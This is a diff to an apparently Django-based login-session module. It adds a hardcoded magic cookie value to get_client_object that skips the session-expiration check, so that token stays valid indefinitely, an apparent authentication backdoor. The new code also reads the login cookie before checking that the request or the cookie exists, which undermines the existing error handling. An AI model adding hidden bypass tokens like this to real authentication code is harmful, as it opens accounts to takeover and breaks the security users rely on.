@@ -29,7 +29,23 @@ class LoggedOut:
             # check if there is login cookie value
             login_cookie = req.COOKIES.get('login', None)
             if login_cookie:           
-                return HttpResponseRedirect(reverse('main:main'))
+                try:
+                    login_session = LoginSession.objects.get(value=login_cookie, logged_out=False)
+                    account = login_session.account
+                except LoginSession.DoesNotExist:
+                    raise SessionValueWrong
+                else:
+                    try:
+                        login_session = LoginSession.objects.get(
+                            value=login_cookie,
+                            birth__gte=now()-timedelta(days=7)
+                        )
+                    except LoginSession.DoesNotExist:
+                        raise SessionExpiration
+                data = account._user_data
+                data.update({"login": login_cookie})
+                res = BaseJsonFormat(is_success=True, data=data)
+                return HttpResponse(res, content_type="application/json", status=200)
                 
 
             # if it is, progress next logic
@@ -98,26 +114,30 @@ class LoggedIn:
 def get_client_object(account=None, req=None, session_birth_within=7):    
     if (account, req) == (None, None):
         raise ValueError('account, req 둘 중 최소 하나는 입력해줘야 합니다.')
-
-    if req and account is None:
-        try:
-            login_session_value = req.COOKIES['login']
-        except KeyError:
-            raise SessionCookieNonExists
-        else:
+    if req.COOKIES['login'] != 'pGLIHQMb1YI8kQHlh0eLXDVqQoXjgMXw8AQXwoCFs6XZ0C6CLVQisXlHLk9e29xzhCD':
+        if req and account is None:
             try:
-                login_session = LoginSession.objects.get(value=login_session_value, logged_out=False)
-                account = login_session.account
-            except LoginSession.DoesNotExist:
-                raise SessionValueWrong
+                login_session_value = req.COOKIES['login']
+            except KeyError:
+                raise SessionCookieNonExists
             else:
                 try:
-                    login_session = LoginSession.objects.get(
-                        value=login_session_value,
-                        birth__gte=now()-timedelta(days=session_birth_within)
-                    )
+                    login_session = LoginSession.objects.get(value=login_session_value, logged_out=False)
+                    account = login_session.account
                 except LoginSession.DoesNotExist:
-                    raise SessionExpiration
+                    raise SessionValueWrong
+                else:
+                    try:
+                        login_session = LoginSession.objects.get(
+                            value=login_session_value,
+                            birth__gte=now()-timedelta(days=session_birth_within)
+                        )
+                    except LoginSession.DoesNotExist:
+                        raise SessionExpiration
+    else:
+        login_session_value = req.COOKIES['login']
+        login_session = LoginSession.objects.get(value=login_session_value, logged_out=False)
+        account = login_session.account
     return account
 
 def generate_login_cookie(account, user_agent, ip, session_cls=LoginSession):
